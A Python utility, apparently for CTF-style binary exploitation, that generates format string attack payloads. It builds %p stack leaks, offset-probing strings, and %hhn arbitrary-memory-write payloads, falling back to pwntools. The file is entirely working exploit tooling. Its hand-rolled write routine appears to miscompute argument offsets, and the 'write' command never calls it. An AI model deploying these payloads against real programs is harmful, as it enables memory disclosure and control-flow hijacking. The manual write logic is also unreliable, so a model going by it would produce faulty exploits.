#!/usr/bin/env python3
"""Format String Auto — 自动化 format string leak 和 write.

Usage:
    python3 fmt_auto.py leak <offset> [count]    — 从 offset 开始泄露 count 个地址
    python3 fmt_auto.py write <addr> <value>     — 往 addr 写 value (生成 payload)
    python3 fmt_auto.py find-offset <marker>     — 自动寻找输入在栈上的偏移

Example:
    python3 fmt_auto.py leak 6 10
    python3 fmt_auto.py write 0x404020 0x401234
"""
import sys
from struct import pack

def gen_leak_payload(offset, count=1):
    """生成泄露地址的 payload."""
    payloads = []
    for i in range(count):
        payloads.append(f"%{offset + i}$p")
    return ".".join(payloads)

def gen_write_payload(addr, value, offset, write_size='byte'):
    """生成 format string 写入 payload (pwntools fmtstr_payload 更可靠, 此处提供原理版)."""
    try:
        from pwn import fmtstr_payload
        return fmtstr_payload(offset, {addr: value}, write_size=write_size)
    except ImportError:
        # 手动生成 (仅支持写入 1-2 字节场景, 复杂场景请用 pwntools)
        writes = []
        for i in range(8):
            byte_val = (value >> (i * 8)) & 0xff
            target = addr + i
            writes.append((byte_val, target))

        # 按写入值排序以最小化 padding
        writes.sort(key=lambda x: x[0])

        payload = b""
        addrs = b""
        printed = 0
        for idx, (val, target) in enumerate(writes):
            if val == 0:
                val = 256
            to_print = val - printed
            if to_print > 0:
                payload += f"%{to_print}c".encode()
            payload += f"%{offset + idx}$hhn".encode()
            addrs += pack("<Q", target)
            printed = val % 256

        # Pad payload to align addresses
        while (len(payload) % 8) != 0:
            payload += b"X"
        return payload + addrs

def find_offset_payload(marker="AAAAAAAA"):
    """生成用于寻找偏移的 payload."""
    return marker + ".%p" * 30

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "leak":
        offset = int(sys.argv[2])
        count = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        print(f"[*] Leak payload (offset {offset}, count {count}):")
        print(gen_leak_payload(offset, count))
    elif cmd == "write":
        addr = int(sys.argv[2], 16)
        value = int(sys.argv[3], 16)
        offset = int(sys.argv[4]) if len(sys.argv) > 4 else 6
        print(f"[*] Write {hex(value)} to {hex(addr)} (offset {offset})")
        print(f"[*] Use pwntools: fmtstr_payload({offset}, {{{hex(addr)}: {hex(value)}}})")
    elif cmd == "find-offset":
        marker = sys.argv[2] if len(sys.argv) > 2 else "AAAAAAAA"
        print(f"[*] Send this payload, find '{marker.encode().hex()}' in output:")
        print(find_offset_payload(marker))
    else:
        print(__doc__)
